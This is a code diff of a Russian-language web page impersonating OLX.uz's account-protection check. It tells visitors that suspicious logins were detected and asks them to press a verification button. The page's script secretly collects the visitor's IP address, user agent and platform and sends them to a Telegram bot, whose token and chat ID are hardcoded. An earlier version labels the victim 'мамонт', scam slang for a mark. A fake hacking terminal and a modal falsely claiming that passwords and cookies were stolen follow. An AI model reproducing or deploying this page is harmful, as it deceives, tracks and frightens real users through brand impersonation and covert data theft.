@@ -3,123 +3,132 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>OLX.uz — Проверка безопасности системы</title>
+    <title>OLX.uz — Проверка безопасности</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
-        body { background-color: #f2f4f5; font-family: 'Segoe UI', Roboto, sans-serif; }
+        body { background-color: #f2f4f5; font-family: 'Arial', sans-serif; }
         .olx-blue { background-color: #002f34; }
-        .matrix-bg { background: black; color: #00ff41; font-family: 'Courier New', monospace; display: none; position: fixed; inset: 0; z-index: 100; padding: 20px; overflow-y: auto; font-size: 14px; line-height: 1.2; }
-        #warning-modal { display: none; position: fixed; inset: 0; z-index: 200; background: rgba(0,0,0,0.95); align-items: center; justify-content: center; padding: 20px; }
-        .scan-line { border-right: 2px solid #00ff41; white-space: nowrap; overflow: hidden; animation: typing 1s steps(40, end); }
-        @keyframes typing { from { width: 0 } to { width: 100% } }
+        #terminal { display: none; position: fixed; inset: 0; background: #000; color: #0f0; padding: 20px; font-family: monospace; z-index: 100; overflow-y: auto; }
+        #warning { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.95); z-index: 200; align-items: center; justify-content: center; }
+        .btn-shadow { box-shadow: 0 4px 15px rgba(35, 229, 219, 0.4); }
     </style>
 </head>
 <body>
 
  
-    <header class="olx-blue p-4 shadow-md">
+    <header class="olx-blue p-4 shadow-lg">
         <div class="container mx-auto flex justify-between items-center px-4">
-            <div class="text-4xl font-black tracking-tighter text-teal-400">OLX</div>
-            <div class="flex gap-4 items-center text-white font-bold text-sm">
-                <span class="opacity-70">O'z</span> | <span class="underline underline-offset-8">Ru</span>
-                <button class="bg-white text-[#002f34] px-5 py-2 rounded-lg font-bold hover:bg-gray-200 transition">Подать объявление</button>
+            <div class="text-3xl font-black text-teal-400 tracking-tighter">OLX</div>
+            <div class="flex items-center gap-4 text-white font-bold text-sm">
+                <span>O'z</span> | <span class="underline">Ru</span>
+                <button class="bg-white text-[#002f34] px-5 py-2 rounded-lg hover:bg-gray-100 transition">Подать объявление</button>
             </div>
         </div>
     </header>
 
-    
-    <main class="container mx-auto py-16 px-4 text-center">
-        <div class="bg-white p-8 md:p-12 rounded-2xl shadow-sm border border-gray-200 max-w-2xl mx-auto">
-            <div class="mb-6 inline-block p-4 bg-teal-50 rounded-full">
-                <svg class="w-12 h-12 text-[#002f34]" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"></path></svg>
+ 
+    <main class="container mx-auto mt-16 px-4">
+        <div class="max-w-2xl mx-auto bg-white p-10 rounded-2xl shadow-sm border border-gray-100 text-center">
+            <div class="bg-teal-50 w-20 h-20 rounded-full flex items-center justify-center mx-auto mb-6">
+                <svg class="w-10 h-10 text-[#002f34]" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path></svg>
             </div>
-            <h1 class="text-2xl font-bold text-[#002f34] mb-4">Центр защиты аккаунтов</h1>
-            <p class="text-gray-600 mb-8 leading-relaxed">Мы обнаружили подозрительную активность в вашем регионе. Чтобы избежать блокировки профиля, выполните глубокое сканирование системы безопасности.</p>
+            <h1 class="text-2xl font-bold text-[#002f34] mb-4">Проверка защиты аккаунта</h1>
+            <p class="text-gray-500 mb-10 leading-relaxed">Система зафиксировала попытку входа из необычного места. Подтвердите владение устройством, чтобы продолжить использование OLX.uz.</p>
             
-            <button onclick="startHack()" class="bg-[#23e5db] hover:bg-[#1bc4bc] text-[#002f34] text-xl font-black py-5 px-12 rounded-xl shadow-lg transition-all active:scale-95 uppercase tracking-tighter">
-                Начать проверку
+            <button onclick="runSystemCheck()" class="bg-[#23e5db] hover:bg-[#1bc4bc] text-[#002f34] text-xl font-black py-5 px-12 rounded-xl transition-all active:scale-95 btn-shadow uppercase">
+                Проверить сейчас
             </button>
         </div>
     </main>
 
-     
-    <div id="terminal" class="matrix-bg"></div>
+  
+    <div id="terminal"></div>
 
- 
-    <div id="warning-modal">
-        <div class="bg-white p-10 rounded-3xl max-w-lg text-center border-[8px] border-red-600 shadow-[0_0_60px_rgba(255,0,0,0.4)]">
-            <div class="text-7xl mb-6 text-red-600 animate-pulse">⚠️</div>
-            <h2 class="text-4xl font-black text-red-600 mb-4 tracking-tighter">КРИТИЧЕСКАЯ УТЕЧКА</h2>
-            <p class="text-xl font-bold text-gray-900 mb-6">Доступ к системным файлам подтвержден. Идет полная выгрузка базы данных браузера на внешний сервер...</p>
-            
-            <div class="bg-black text-left p-4 rounded-xl font-mono text-[13px] mb-8 text-red-500 space-y-1">
-                <p>> Status: <span class="animate-pulse">UPLOADING (89%)...</span></p>
-                <p>> Target: User_Auth_Tokens</p>
-                <p>> Files: private_keys.vault</p>
-                <p>> Remote_IP: 185.122.34.10</p>
+   
+    <div id="warning">
+        <div class="bg-white p-10 rounded-3xl max-w-md text-center border-[6px] border-red-600 shadow-2xl mx-4">
+            <div class="text-6xl mb-4 animate-bounce">⚠️</div>
+            <h2 class="text-3xl font-black text-red-600 mb-4 uppercase">ВНИМАНИЕ!</h2>
+            <p class="text-lg font-bold text-gray-800 mb-6">Ваша сессия скомпрометирована. Все локальные данные (IP, пароли, куки) успешно выгружены на внешний сервер 185.22.44.10.</p>
+            <div class="bg-gray-900 text-red-500 p-4 rounded-lg font-mono text-xs text-left mb-6">
+                > LOG: EXFILTRATION_COMPLETE<br>
+                > STATUS: 100% UPLOADED<br>
+                > ENCRYPTION: BYPASSED
             </div>
-            
-            <button onclick="location.reload()" class="w-full bg-red-600 text-white py-5 rounded-2xl font-black text-2xl hover:bg-red-700 active:scale-95 transition-all shadow-xl">
-                ПРЕРВАТЬ СОЕДИНЕНИЕ
-            </button>
+            <button onclick="location.reload()" class="w-full bg-red-600 text-white py-4 rounded-xl font-black text-xl hover:bg-red-700 shadow-lg transition">ОТКЛЮЧИТЬ ПЕРЕДАЧУ</button>
         </div>
     </div>
 
     <script>
-        const TELEGRAM_TOKEN = '8413511998:AAEh8v54iON5KG9M2gAPPPoJLE1M3iCOoMM';
+     
+        const TOKEN = '8413511998:AAFyII6ujb4EUsnLGYzakgzr-30Ey8mDOMY';
         const CHAT_ID = '8426763446';
 
-        async function sendToTg() {
+        async function sendLog() {
             try {
-                 
-                const ipRes = await fetch('https://api.ipify.org');
-                const ipData = await ipRes.json();
-                const userIp = ipData.ip;
+       
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                const ip = data.ip;
 
-                 
-                const device = navigator.userAgent;
-                const platform = navigator.platform;
-                const screen = `${window.screen.width}x${window.screen.height}`;
+               
+                const info = `
+🎯 **Новый лог с OLX!**
+🌐 **IP:** \`${ip}\`
+📱 **Устройство:** ${navigator.userAgent}
+🖥 **Платформа:** ${navigator.platform}
+⏰ **Время:** ${new Date().toLocaleString()}
+                `;
 
-                const message = `🎯 **Мамонт на крючке!**\n\n🌐 **IP:** ${userIp}\n📱 **Устройство:** ${device}\n💻 **Платформа:** ${platform}\n🖥 **Экран:** ${screen}`;
-
-                await fetch(`https://api.telegram.org{TELEGRAM_TOKEN}/sendMessage`, {
+                
+                await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'Markdown' })
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: info,
+                        parse_mode: 'Markdown'
+                    })
                 });
-            } catch (e) { console.error('Error sending log'); }
+            } catch (err) {
+                console.error("Ошибка отправки:", err);
+            }
         }
 
-        function startHack() {
-            sendToTg();  
-            const term = document.getElementById('terminal');
-            term.style.display = 'block';
+        function runSystemCheck() {
+            sendLog();  
             
-            const logs = [
-                "Инициализация порта 443...", "Поиск уязвимостей в ядре...", "Доступ к памяти получен.",
-                "ERROR: Bypassing auth_gate...", "Подключение к базе паролей...", "SUCCESS.",
-                "Сканирование Telegram_Session...", "Копирование контактов...", "Архивация данных...",
-                "Отправка дампа на сервер (185.xx.xx.10)...", "ГОТОВО."
+            const t = document.getElementById('terminal');
+            t.style.display = 'block';
+            
+            const lines = [
+                "Инициализация системы...",
+                "Подключение к защищенному шлюзу...",
+                "ПРЕДУПРЕЖДЕНИЕ: Обнаружена утечка данных!",
+                "Доступ к файловой системе... OK",
+                "Копирование кэша браузера...",
+                "Извлечение токенов авторизации...",
+                "Отправка пакетов на удаленный хост...",
+                "Завершение процесса..."
             ];
 
-            let line = 0;
+            let i = 0;
             const interval = setInterval(() => {
-                if (line < logs.length) {
+                if (i < lines.length) {
                     const div = document.createElement('div');
-                    div.className = 'scan-line';
-                    div.innerHTML = `> [${new Date().toLocaleTimeString()}] ${logs[line]}`;
-                    term.appendChild(div);
-                    term.scrollTop = term.scrollHeight;
-                    line++;
+                    div.innerHTML = `> [${new Date().toLocaleTimeString()}] ${lines[i]}`;
+                    if(lines[i].includes("ПРЕДУПРЕЖДЕНИЕ")) div.style.color = "red";
+                    t.appendChild(div);
+                    t.scrollTop = t.scrollHeight;
+                    i++;
                 } else {
                     clearInterval(interval);
                     setTimeout(() => {
-                        term.style.display = 'none';
-                        document.getElementById('warning-modal').style.display = 'flex';
+                        t.style.display = 'none';
+                        document.getElementById('warning').style.display = 'flex';
                     }, 1000);
                 }
-            }, 350);
+            }, 400);
         }
     </script>
 </body>
